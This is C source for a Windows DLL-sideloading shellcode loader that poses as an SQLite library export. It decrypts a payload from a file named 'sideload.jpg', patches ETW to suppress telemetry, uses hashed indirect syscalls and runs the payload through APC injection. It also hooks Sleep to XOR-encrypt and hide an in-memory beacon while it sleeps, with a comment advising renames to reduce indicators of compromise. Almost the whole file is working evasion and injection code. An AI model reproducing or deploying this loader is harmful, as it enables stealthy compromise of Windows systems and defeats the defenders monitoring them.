#include <Windows.h>
#include <stdint.h>
#include <stdio.h>
#include "HellsHall.h"
#include "aes.h"
#include "helperfunc.h"
#include "linker.h"

// #define DEBUG 
// #define BASIC_INJECTION
#define APC_INJECTION


// generated by 'Hasher' Rs
#define NtAllocateVirtualMemory_rs		0x898AD7C7
#define NtCreateProcessEx_rs			0x437D3FCA
#define NtWriteVirtualMemory_rs			0xDEF572D9
#define NtWaitForSingleObject_rs		0x2E5E83CF
#define NtRemoveProcessDebug_rs			0x2A2ACAD2
#define NtQueueApcThreadEx_rs			0x441C1164
#define NtProtectVirtualMemory_rs		0xD8D55D43
#define NtCreateThreadEx_rs				0x979AE967
#define EtwEventWrite_rs 			    0xC75F0951 
#define NtTraceEvent_rs					0x5351B8C7 
#define NtReadVirtualMemory_rs			0xF44B918A
#define PAYLOAD							L"sideload.jpg"	
#define BLOCK_SIZE 8
#define KEY_SIZE   16

#ifdef _M_X64
#define TRAMPOLINE_SIZE 13   // mov r10, imm64 (10) + jmp r10 (3)
#else
#endif

// a structure to keep the used sycalls
typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;
	NT_SYSCALL	NtWriteVirtualMemory;
	NT_SYSCALL	NtCreateProcessEx;
	NT_SYSCALL	NtRemoveProcessDebug;
	NT_SYSCALL	NtQueueApcThreadEx;
	NT_SYSCALL	NtReadVirtualMemory;

}NTAPI_FUNC, * PNTAPI_FUNC;
typedef struct _HookSt {
	BYTE  pOriginalBytes[TRAMPOLINE_SIZE];
	PVOID pFunctionToHook;
	PVOID pFunctionToRun;
	DWORD dwOldProtection;
	BOOL  installed;
} HookSt, * PHookSt;
typedef struct _RWX_MEM {
	PVOID baseAddress;
	SIZE_T size;
} RWX_MEM, * PRWX_MEM;

typedef INT(WINAPI* fnsqlite3_libversion_number)(void);
NTAPI_FUNC g_Nt = { 0 };
RWX_MEM g_RWX = { 0 };
static HookSt g_st = { 0 };
static CRITICAL_SECTION g_hookLock;


// page-aligned VirtualProtect wrapper
static BOOL VirtualProtectRange(PVOID address, SIZE_T len, DWORD newProt, DWORD* oldProtOut){
	SYSTEM_INFO si;
	GetSystemInfo(&si);
	SIZE_T pageSize = si.dwPageSize;
	uintptr_t start = (uintptr_t)address & ~(pageSize - 1);
	uintptr_t end = ((uintptr_t)address + len + pageSize - 1) & ~(pageSize - 1);
	SIZE_T size = end - start;
	DWORD old = 0;
	//BOOL ok = VirtualProtect((LPVOID)start, size, newProt, &old);
	// Using syscall 
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	BOOL ok = (RunSyscall((HANDLE)-1, (PVOID*)&start, &size, newProt, &old) == 0);
	if (oldProtOut) *oldProtOut = old;
	return ok;
}

// safe write memory helper (changes protection, writes, flushes, restores)
static BOOL WriteMemory(PVOID dst, const void* src, SIZE_T len)
{
	DWORD oldProt = 0;
	if (!VirtualProtectRange(dst, len, PAGE_EXECUTE_READWRITE, &oldProt)) {
		//PRINT("[!] VirtualProtectRange failed: %u\n", GetLastError());
		return FALSE;
	}

	memcpy(dst, src, len);
	FlushInstructionCache(GetCurrentProcess(), dst, len);

	// restore original protection
	DWORD tmp = 0;
	if (!VirtualProtectRange(dst, len, oldProt, &tmp)) {
		// not fatal for demo but log
		//PRINT("[!] Restore VirtualProtectRange failed: %u\n", GetLastError());
	}
	return TRUE;
}

// Resolve the real Sleep implementation from KernelBase.dll (modern Windows)
static PVOID ResolveRealSleep(void) {
	HMODULE hKB = GetModuleHandleW(L"KernelBase.dll");
	if (!hKB) hKB = LoadLibraryW(L"KernelBase.dll");
	if (!hKB) return NULL;
	return (PVOID)GetProcAddress(hKB, "Sleep");
}

// Initialize hook struct: resolve target, save original bytes & protection
BOOL InitializeHookStruct(PHookSt Hook, PVOID pFunctionToRun)
{
	if (!Hook || !pFunctionToRun) return FALSE;

	Hook->pFunctionToRun = pFunctionToRun;

	Hook->pFunctionToHook = ResolveRealSleep();
	if (!Hook->pFunctionToHook) {
		//printf("[!] ResolveRealSleep failed\n");
		return FALSE;
	}

	// Save original bytes
	memcpy(Hook->pOriginalBytes, Hook->pFunctionToHook, TRAMPOLINE_SIZE);

	// Save old protection (best effort)
	DWORD old = 0;
	if (!VirtualProtectRange(Hook->pFunctionToHook, TRAMPOLINE_SIZE, PAGE_EXECUTE_READ, &old)) {
		// if this fails, still continue but set a plausible default
		Hook->dwOldProtection = PAGE_EXECUTE_READ;
	}
	else {
		Hook->dwOldProtection = old;
		// restore to original prot (we only queried, VirtualProtectRange already restored it)
		DWORD tmp; VirtualProtectRange(Hook->pFunctionToHook, TRAMPOLINE_SIZE, old, &tmp);
	}

	Hook->installed = FALSE;
	return TRUE;
}

// Install hook: write mov r10, imm64 ; jmp r10
BOOL InstallHook(PHookSt Hook)
{
	if (!Hook || !Hook->pFunctionToHook || !Hook->pFunctionToRun) return FALSE;
	if (Hook->installed) return TRUE;

	BYTE patch[TRAMPOLINE_SIZE];
	ZeroMemory(patch, sizeof(patch));
	// mov r10, imm64
	patch[0] = 0x49; patch[1] = 0xBA;
	uint64_t addr = (uint64_t)Hook->pFunctionToRun;
	memcpy(&patch[2], &addr, sizeof(addr));
	// jmp r10
	patch[10] = 0x41; patch[11] = 0xFF; patch[12] = 0xE2;

	if (!WriteMemory(Hook->pFunctionToHook, patch, TRAMPOLINE_SIZE)) {
		//PRINT("[!] Install WriteMemory failed: %u\n", GetLastError());
		return FALSE;
	}

	Hook->installed = TRUE;
	return TRUE;
}

// Temporarily remove hook (restore original bytes) but keep Hook struct intact
BOOL TmpRemoveHook(PHookSt Hook)
{
	if (!Hook || !Hook->pFunctionToHook) return FALSE;
	if (!Hook->installed) return TRUE; // already removed

	if (!WriteMemory(Hook->pFunctionToHook, Hook->pOriginalBytes, TRAMPOLINE_SIZE)) {
		//PRINT("[!] TmpRemoveHook WriteMemory failed: %u\n", GetLastError());
		return FALSE;
	}

	Hook->installed = FALSE;
	return TRUE;
}

// Final remove (same as tmp here; could free trampolines if allocated)
BOOL RemoveHook(PHookSt Hook)
{
	return TmpRemoveHook(Hook);
}

int DummyFunction() {
	// dummy code
	int		j = rand();
	int		i = j + rand();
	return -1;
}

VOID AlertableFunction5() {

	HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
	HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);

	if (hEvent1 && hEvent2) {
		SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
		CloseHandle(hEvent1);
		CloseHandle(hEvent2);
	}
}

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_rs, &g_Nt.NtAllocateVirtualMemory)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
#endif // DEBUG

		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtProtectVirtualMemory_rs, &g_Nt.NtProtectVirtualMemory)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtCreateThreadEx_rs, &g_Nt.NtCreateThreadEx)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtWaitForSingleObject_rs, &g_Nt.NtWaitForSingleObject)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);
#endif // DEBUG
	if (!FetchNtSyscall(NtWriteVirtualMemory_rs, &g_Nt.NtWriteVirtualMemory)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtWriteVirtualMemory \n");
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtWriteVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);
#endif // DEBUG
	if (!FetchNtSyscall(NtCreateProcessEx_rs, &g_Nt.NtCreateProcessEx)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateProcessEx \n");
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtCreateProcessEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateProcessEx.dwSSn, g_Nt.NtCreateProcessEx.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtRemoveProcessDebug_rs, &g_Nt.NtRemoveProcessDebug)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtRemoveProcessDebug \n");
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtRemoveProcessDebug Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtRemoveProcessDebug.dwSSn, g_Nt.NtRemoveProcessDebug.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtQueueApcThreadEx_rs, &g_Nt.NtQueueApcThreadEx)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtQueueApcThreadEx \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtQueueApcThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtQueueApcThreadEx.dwSSn, g_Nt.NtQueueApcThreadEx.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtReadVirtualMemory_rs, &g_Nt.NtReadVirtualMemory)) {
#ifdef DEBUG
		printf("[!] Failed In Obtaining The Syscall Number Of NtReadVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Syscall Number Of NtReadVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtReadVirtualMemory.dwSSn, g_Nt.NtReadVirtualMemory.pSyscallInstAddress);
#endif

	return TRUE;
}

BOOL EtwPatch(HANDLE hProcess) {
	NTSTATUS STATUS = 0;
	LPVOID pEtwEventWrite = FindETWbyHash(NtTraceEvent_rs);
	if (!pEtwEventWrite) {
#ifdef DEBUG
		printf("[!] Failed to get EtwEventWrite\n");
#endif
		return FALSE;
	}

	char patch[] = { 0x90, 0xC3, 0x90, 0x90, 0x90, 0x90 };
	SIZE_T patchSize = sizeof(patch);

	// Change protection
	ULONG oldProtect = 0;
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	PVOID base = pEtwEventWrite;
	SIZE_T regionSize = patchSize;
	STATUS = RunSyscall(hProcess, &base, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (STATUS != 0) {
#ifdef DEBUG
		printf("[!] NtProtectVirtualMemory Failed With STATUS : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// Write patch
	SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
	STATUS = RunSyscall(hProcess, pEtwEventWrite, patch, patchSize, NULL);
	if (STATUS != 0) {
#ifdef DEBUG
		printf("[!] NtWriteVirtualMemory Failed With STATUS : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// Restore protection
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	STATUS = RunSyscall(hProcess, &base, &regionSize, oldProtect, &oldProtect);

	return (STATUS == 0);
}

VOID _Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength)
{

	PBYTE D = (PBYTE)pDestination;
	PBYTE S = (PBYTE)pSource;

	while (sLength--)
		*D++ = *S++;
}

RWX_MEM FindRWXMemory(HANDLE hProcess) {
	RWX_MEM result = { 0 };
	SYSTEM_INFO si;
	GetSystemInfo(&si);

	MEMORY_BASIC_INFORMATION mbi;
	PBYTE addr = (PBYTE)si.lpMinimumApplicationAddress;

	while (addr < (PBYTE)si.lpMaximumApplicationAddress) {
		SIZE_T querySize = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));
		if (querySize == 0)
			break;

		// Look for private, committed memory regions with RWX permissions
		if (mbi.State == MEM_COMMIT &&
			mbi.Type == MEM_PRIVATE &&
			(mbi.Protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE)
		{
			BYTE header[2] = { 0 };
			SIZE_T bytesRead = 0;

			// SET_SYSCALL(g_Nt.NtReadVirtualMemory);
			// Try reading first two bytes (MZ header)
			if (ReadProcessMemory(hProcess, mbi.BaseAddress, header, sizeof(header), &bytesRead) &&
				bytesRead == sizeof(header))
			{
				if (header[0] == 0x4D && header[1] == 0x5A) { // "MZ"
					result.baseAddress = mbi.BaseAddress;
					result.size = mbi.RegionSize;
					return result;
				}
			}
		}

		// Move to next memory region
		addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
	}

	return result; // Not found
}

PVOID  g_pFinalAddress = NULL;
SIZE_T g_size = 0;
#define					PAGE_SIZE					4096
#define					SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )
// Create APC to run the payload once the thread enters an alertable state
BOOL LocalApcInjection(HANDLE hThread, PBYTE pPayload, size_t sPayloadSize) {

	NTSTATUS	STATUS = 0;
	SIZE_T		sNewPayloadSize = SET_TO_MULTIPLE_OF_4096(sPayloadSize),
				sChunkSize = PAGE_SIZE;
	DWORD		ii = sNewPayloadSize / PAGE_SIZE,
				dwOldPermissions = 0x00;
	PVOID		pAddress = NULL,
				pTmpAddress = NULL;
	PBYTE		pTmpPayload = NULL;
	HANDLE		hProcess = (HANDLE)-1; // local process

	// reserve a contiguous region (leave one extra page as guard)
	sNewPayloadSize = sNewPayloadSize + PAGE_SIZE;

	// === Reserve only (not commit) ===
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY)) != 0x00 || pAddress == NULL) {
#ifdef DEBUG
		PRINT("[!] NtAllocateVirtualMemory[1] Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}
	// --- 

#ifdef DEBUG
	PRINT("[+] Allocated Memory At Address 0x%p \n", pAddress);
#endif

	// fix base: leave the first page reserved/RO as guard
	sNewPayloadSize = sNewPayloadSize - PAGE_SIZE;
	pAddress = (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);
	pTmpAddress = pAddress;

	// === Commit page-by-page inside the reserved region (MEM_COMMIT only) ===
	for (DWORD i = 0; i < ii; i++) {
		SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
		// commit into the previously reserved area; use MEM_COMMIT only
		if ((STATUS = RunSyscall(hProcess, &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE)) != 0x00) {
#ifdef DEBUG
			PRINT("[!] NtAllocateVirtualMemory[2] Failed With Error: 0x%0.8X \n", STATUS);
#endif
			return -1;
		}
		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	pTmpAddress = pAddress;

	// make each page RX/RWX as you intended
	for (DWORD i = 0; i < ii; i++) {
		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
		if ((STATUS = RunSyscall(hProcess, &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions)) != 0x00) {
#ifdef DEBUG
			PRINT("[!] NtProtectVirtualMemory[%d] Failed With Error: 0x%0.8X\n", i, STATUS);
#endif
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	// Starting from the base address 
	pTmpAddress = pAddress;
	pTmpPayload = pPayload;

	// Copy the payload in chunks of PAGE_SIZE bytes using NtWriteVirtualMemory
	for (DWORD i = 0; i < ii; i++) {
		SIZE_T bytesWritten = 0;
		SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
		// pass a real bytesWritten pointer (not NULL)
		if ((STATUS = RunSyscall(hProcess, pTmpAddress, pTmpPayload, sChunkSize, &bytesWritten)) != 0x00) {
#ifdef DEBUG
			PRINT("[!] NtWriteVirtualMemory[%d] Failed With Error: 0x%0.8X \n", i, STATUS);
#endif
			return -1;
		}
		// optional sanity: you could test bytesWritten == sChunkSize, but skipping for minimal change
		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
		pTmpPayload = pTmpPayload + sChunkSize;
	}

	// queue APC
	SET_SYSCALL(g_Nt.NtQueueApcThreadEx);
	if ((STATUS = RunSyscall(hThread, NULL, pAddress, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		PRINT("[!] NtQueueApcThreadEx Failed With STATUS : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}
	//PRINT("[APC]\tAPC Queued To Thread %d With Payload Address: 0x%p \n", GetThreadId(hThread), pAddress);
	// Make global variables to avoid optimization removal 
	g_pFinalAddress = pAddress;
	g_size = sNewPayloadSize;
	return 0;
}

// XOR encrypt - decrypt payload 
VOID EncDec(IN PVOID pBaseAddr, IN SIZE_T payloadSize){
	if (pBaseAddr == NULL || payloadSize == 0) return;

	const unsigned char key[KEY_SIZE] = {
		'M','S','F','T','1','2','3','4','5','6','7','8','9','0','!','@'
	};

	unsigned char* buf = (unsigned char*)pBaseAddr;
	for (SIZE_T i = 0; i < payloadSize; ++i) {
		buf[i] ^= key[i % KEY_SIZE];
	}

	//printf("[EncDec]\tEncDec completed on address: 0x%p, size: %zu\n", pBaseAddr, payloadSize);
}

// Expand environment variables in the given path
wchar_t* ExpandPath(const wchar_t* path) {
	static wchar_t expanded[MAX_PATH];

	if (ExpandEnvironmentStringsW(path, expanded, MAX_PATH) == 0) {
		wprintf(L"[!] Failed to expand path: %ls\n", path);
		return NULL;
	}
	return expanded;
}

typedef VOID(WINAPI* Sleep_t)(DWORD);

VOID WINAPI MySleep(DWORD dwMilliseconds) {
	EnterCriticalSection(&g_hookLock);

	// Temporarily unhook (restore original bytes). Do NOT NULL out Hook struct.
	if (!TmpRemoveHook(&g_st)) {
#ifdef DEBUG
		printf("\t[MySleep] TmpRemoveHook failed inside MySleep\n");
#endif
		LeaveCriticalSection(&g_hookLock);
		return;
	}
	//MessageBoxA(NULL, "Sleep Hijacking. Switch Permission", "Info", MB_OK);
	RWX_MEM res = FindRWXMemory((HANDLE)-1);
	if (res.baseAddress == NULL || res.size == 0) {
#ifdef DEBUG
		printf("\t[MySleep] FindRWXMemory failed inside MySleep\n");
#endif
		LeaveCriticalSection(&g_hookLock);
		return;
	}
	g_RWX = res;

	//printf("[MySleep]\tFound RWX memory at 0x%p, size: %zu.\n >>\t\tPossibly reflective beacon shellcode.\n", res.baseAddress, res.size);
	
	// ------------ [Just Add] --------------
	PVOID baseAddress = res.baseAddress;
	SIZE_T size = res.size;
	DWORD oldProtect = 0;
	EncDec(baseAddress, size); // XOR encrypt the payload in place
	if (baseAddress) {
		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
		RunSyscall((HANDLE)-1, &baseAddress, &size, PAGE_READWRITE, &oldProtect);
	}
	// ------------ [Just Add] --------------
	// Call the original Sleep (now unhooked): this will execute the real KernelBase!Sleep
	//printf("[MySleep] Address: 0x%p, size: %zu\n", g_pFinalAddress, g_size);
	Sleep(dwMilliseconds);
	

	if (!InstallHook(&g_st)) {
#ifdef DEBUG
		printf("\t[MySleep] Reinstall InstallHook failed inside MySleep: %u\n", GetLastError());
#endif
	}
	LeaveCriticalSection(&g_hookLock);
}


BOOL MemoryPrivateCheck(PVOID pAddress) {
	MEMORY_BASIC_INFORMATION mbi;
	if (VirtualQuery(pAddress, &mbi, sizeof(mbi)) == 0) {
		return FALSE;
	}

	// Check if the memory is private and has read-write-execute permissions
	if (mbi.Type == MEM_PRIVATE && (mbi.Protect & (PAGE_READWRITE))) {
		//PRINT("[DEBUG] MemoryPrivateCheck: Address 0x%p is private and RW\n", pAddress);
		return TRUE;
	}
	return FALSE;
}


// VEH handler for decryption - Flip protection to RWX
LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS pExceptionInfo) {
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		// Change protection to RWX

		//PRINT("[VEH]\tVEH triggered for address: 0x%p\n", g_RWX.baseAddress);
		DWORD oldProtect = 0;
		SIZE_T size = g_RWX.size;
		PVOID baseAddress = g_RWX.baseAddress;
		PVOID baseAddrPtr = baseAddress;    // local copy
		SIZE_T sizeLocal = size;
		if (baseAddress) {
			SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
			RunSyscall((HANDLE)-1, &baseAddrPtr, &sizeLocal, PAGE_EXECUTE_READWRITE, &oldProtect);
		}
		// XOR decrypt the payload in place
		EncDec(baseAddrPtr, sizeLocal);
		//printf("[VEH]\tDecrypted address: 0x%p, size: %zu\n", baseAddrPtr, sizeLocal);
		
		// Return to the instruction that caused the exception
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

BOOL InitializeHook() {
	SetConsoleOutputCP(CP_UTF8);
	InitializeCriticalSection(&g_hookLock);

	//printf("[DLLMAIN] DLL_PROCESS_ATTACH\n");
	if (!InitializeHookStruct(&g_st, (PVOID)MySleep)) {
		//printf("[DLLMAIN] InitializeHookStruct failed\n");
		return -1;
	}

	// Install hook
	if (!InstallHook(&g_st)) {
		//printf("[DLLMAIN] InstallHook failed\n");
		return -1;
	}
}

// Just for testing - export a function to run the payload - Change name for less IOCs
BOOL sqlite3_get_dependency() {

	NTSTATUS	STATUS = NULL;
	PVOID		pAddress = NULL;
	DWORD		dwOld = NULL;
	size_t		payload_size = 0;
	HANDLE		hProcess = (HANDLE)-1,	// local process
				hThread = NULL;

	// Add VEH handler for decryption
	HANDLE hVeh = AddVectoredExceptionHandler(1, VectoredHandler);
	if (!hVeh) {
#ifdef DEBUG
		PRINT("[!] AddVectoredExceptionHandler failed: %u\n", GetLastError());
#endif
		return -1;
	}

	wchar_t* expandedPath = ExpandPath(PAYLOAD);
	if (!expandedPath) {
		int i = DummyFunction();
		return -1;
	}

	if (!InitializeHook()) {
		int i = DummyFunction();
		return -1;
	}

	// Convert wide string -> UTF-8 (or ANSI) before passing to Decrypt()
	char utf8Path[MAX_PATH];
	size_t converted = 0;
	wcstombs_s(&converted, utf8Path, MAX_PATH, expandedPath, _TRUNCATE);

	unsigned char* Decrypted = Decrypt(utf8Path, &payload_size);
	if (!Decrypted) {
#ifdef DEBUG
		printf("[!] Failed To Decrypt The Payload \n");
#endif
		return -1;
	}

//	// initializing the used syscalls
//	if (!InitializeNtSyscalls()) {
//#ifdef DEBUG
//		printf("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
//#endif
//		int i = DummyFunction();
//		return -1;
//	}

	// ETW patching ETWEventWrite
	if (!EtwPatch(hProcess)) {
#ifdef DEBUG
		printf("[!] Failed To Patch EtwEventWrite \n");
#endif
		return -1;
	}

#ifdef APC_INJECTION
	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)AlertableFunction5, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		printf("[!] NtCreateThreadEx Failed With STATUS : 0x%0.8X\n", STATUS);
#endif 
		return -1;
	}

#ifdef DEBUG
	printf("[+] Thread %d Created Of Entry: 0x%p \n", GetThreadId(hThread), (LPTHREAD_START_ROUTINE)AlertableFunction5);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

#endif 

#ifdef DEBUG
	printf("[+] Payload Address: 0x%p, size: %zu", Decrypted, payload_size);
	getchar();
#endif // DEBUG

	
	if (LocalApcInjection(hThread, Decrypted, payload_size) != 0) {
#ifdef DEBUG
		printf("[!] Failed In LocalApcInjection \n");
#endif 
		return -1;
	}
	int k = DummyFunction();

	//--------------------------------------------------------------------
	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
#ifdef DEBUG
		printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}
#endif // APC_INJECTION

}

extern _declspec(dllexport) INT sqlite3_libversion_number() {
	HANDLE hModule = NULL;
	fnsqlite3_libversion_number pfn = NULL;

	// Change name here too
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sqlite3_get_dependency, NULL, 0, NULL);

	hModule = LoadLibraryA(L"DLLSideload.dll");
	if (hModule == NULL) {
		return -1;
	}

	pfn = (fnsqlite3_libversion_number)GetProcAddress(hModule, "sqlite3_libversion_number");
	if (pfn == NULL) {
		FreeLibrary(hModule);
		return -1;
	}
	INT ret = pfn();
}

/* ----------------- DllMain: minimal, non-blocking ----------------- */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// initializing the used syscalls
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InitializeNtSyscalls, NULL, 0, NULL);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		/*if (!RemoveHook(&g_st)) {
			printf("[DLLMAIN] RemoveHook failed\n");
		}
		else {
			printf("[DLLMAIN] Hook removed permanently\n");
		}*/
		break;
	}
	return TRUE;
}